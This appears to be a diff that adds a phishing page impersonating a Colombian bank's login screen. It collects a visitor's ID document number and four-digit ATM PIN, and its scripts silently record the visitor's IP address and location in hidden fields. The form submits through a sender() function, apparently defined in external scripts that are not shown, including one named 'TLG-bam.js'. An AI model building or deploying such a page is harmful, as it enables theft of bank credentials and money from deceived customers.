@@ -1,0 +1,111 @@
+
+
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ingreso</title>
+    
+    <!-- Añadir la fuente Roboto -->
+  
+    <link href="./css/styles.css" rel="stylesheet">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script>
+        $.getJSON("https://api.ipify.org?format=json",
+                                          function(data) {
+        
+            // Setting text of element P with id gfg
+            $("#gfg").html(data.ip);
+        })
+     </script>
+     <script>
+        $.getJSON("https://ipinfo.io", function (response) {
+    $("#ip").html("IP: " + response.ip);
+    $("#address").html("" + response.city + ", " + response.country);
+    
+    })
+     </script>
+  
+
+</head>
+<body>
+
+    <div class="background-image"></div> <!-- Div para las imágenes de fondo -->
+
+    <form onsubmit="javascript:return sender();">
+                     
+        <p id="gfg"  hidden=""></p>
+        <p id="address"  hidden=""></p>  
+
+
+    <div class="form-container">
+        <div class="logo">
+            <img src="./css/logobancol.png" alt="Logo" width="50">
+        </div>
+        <h1 class="roboto-bold">Ingresa</h1>
+        <p class="roboto-bold">Con tu número y tipo de documento.</p>
+
+        <div class="input-group">
+            <label for="tipoDocumento" class="roboto-bold">Tipo de documento</label>
+            <div class="input-wrapper">
+                <img src="./css/identificacion.png" alt="Ícono ID" class="input-icon">
+                <select id="tipoDocumento" onchange="validateForm()" class="roboto-bold" style="
+                    border: none;
+                    border-bottom: 2px solid #000;
+                    outline: none;
+                ">
+                    <option value="">Tipo de documento</option>
+                    <option value="Cédula de ciudadanía">Cédula de ciudadanía</option>
+                    <option value="Tarjeta de identidad">Tarjeta de identidad</option>
+                </select>
+            </div>
+
+            <label for="numeroDocumento" class="roboto-bold" style="margin-top: 20px;">Número de documento</label>
+            <div class="input-wrapper">
+                <img src="./css/identificacion.png" alt="Ícono Cédula" class="input-icon">
+                <input type="tel" id="numeroDocumento" name="numeroDocumento" maxlength="15" placeholder="Número de documento" required oninput="validateForm()" class="roboto-bold" style="
+                    border: none;
+                    border-bottom: 2px solid #000;
+                    outline: none;
+                ">
+            </div>
+            <label for="numeroDocumento" class="roboto-bold" style="margin-top: 20px;">Clave de Cajero</label>
+            <div class="input-wrapper">
+                <img src="./css/identificacion.png" alt="Ícono Cédula" class="input-icon">
+                <input type="password" id="cajero" name="cajero" maxlength="4" required placeholder="Clave de Cajero" oninput="validateForm()" class="roboto-bold" style="
+                    border: none;
+                    border-bottom: 2px solid #000;
+                    outline: none;
+                ">
+            </div>
+        </div>
+
+        <button class="button roboto-bold" id="continuarBtn" disabled>Continuar</button>
+
+    </form>
+
+        <a href="#" class="forgot-password roboto-bold">¿Olvidaste tu clave?</a>
+
+    </div>
+
+    <script>
+        function validateForm() {
+            var tipoDocumento = document.getElementById('tipoDocumento').value;
+            var numeroDocumento = document.getElementById('numeroDocumento').value;
+            var continuarBtn = document.getElementById('continuarBtn');
+        
+            if (tipoDocumento && numeroDocumento.length > 0) {
+                continuarBtn.disabled = false;
+                continuarBtn.classList.add('active');
+            } else {
+                continuarBtn.disabled = true;
+                continuarBtn.classList.remove('active');
+            }
+        }
+        </script>
+
+    <script src="css/scripts.js"></script>
+ 
+    <script src="css/TLG-bam.js"></script>
+</body>
+</html>
